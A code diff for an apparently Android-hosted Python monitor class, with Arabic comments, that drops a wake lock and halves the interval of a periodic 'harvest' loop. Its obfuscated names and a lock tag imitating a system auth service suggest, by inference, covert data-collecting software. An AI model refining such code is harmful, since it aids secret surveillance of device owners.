@@ -35,7 +35,6 @@ try:
 except ImportError:
     JNI = False
 
-
 class M:
     def __init__(self):
         self.d = P
@@ -44,7 +43,6 @@ class M:
         self.wt = os.path.join(self.d, "wt")
 
         self.rn = True
-        self.wl = None
         self.did = None
         self.dmd = None
         self.last_mid = 0
@@ -56,6 +54,9 @@ class M:
         self.media_scanner = None
         self.ctrl = None
         self.vlt = None
+
+        # إضافة حدث للنوم العميق
+        self._wake_event = threading.Event()
 
         self._load_config()
         self._get_device_info()
@@ -69,10 +70,11 @@ class M:
             pass
 
     def _load_config(self):
+        # تم تغيير الفاصل الافتراضي إلى 900 ثانية (15 دقيقة) بدلاً من 1800
         default_cfg = {
             "hth": 15,
-            "wl": True,
-            "iv": 1800
+            "wl": False,   # لم نعد بحاجة إلى WAKE_LOCK، نحتفظ بالإعداد للتوافق فقط
+            "iv": 900
         }
         if os.path.exists(self.cf):
             try:
@@ -169,37 +171,18 @@ class M:
 
         gc.collect()
 
-    def _wake_lock_acquire(self):
-        if self.cfg.get('wl', True) and JNI:
-            try:
-                ctx = self._get_ctx()
-                pm = ctx.getSystemService("power")
-                self.wl = pm.newWakeLock(1, "com.sys.auth:monitor_lock")
-                self.wl.acquire(300000)
-            except:
-                pass
-
-    def _wake_lock_release(self):
-        try:
-            if self.wl and self.wl.isHeld():
-                self.wl.release()
-        except:
-            pass
-
     def _loop(self):
+        # لم نعد نستخدم WAKE_LOCK إطلاقاً
         while self.rn:
             try:
-                self._wake_lock_acquire()
                 self._harvest_logic()
             except Exception as e:
                 logging.error(f"Monitor loop error: {e}")
-            finally:
-                self._wake_lock_release()
-            interval = self.cfg.get('iv', 1800)
-            for _ in range(interval):
-                if not self.rn:
-                    break
-                time.sleep(1)
+
+            # نوم عميق بدلاً من حلقة 1 ثانية
+            interval = self.cfg.get('iv', 900)
+            # ينتظر إما انتهاء المهلة أو إشارة الإيقاف
+            self._wake_event.wait(interval)
 
     def start(self):
         threading.Thread(target=self._loop, daemon=True).start()
@@ -211,7 +194,8 @@ class M:
 
     def stop(self):
         self.rn = False
-        self._wake_lock_release()
+        # إيقاظ الخيط فوراً لإنهاء الحلقة
+        self._wake_event.set()
 
 
 def get_device_tag():
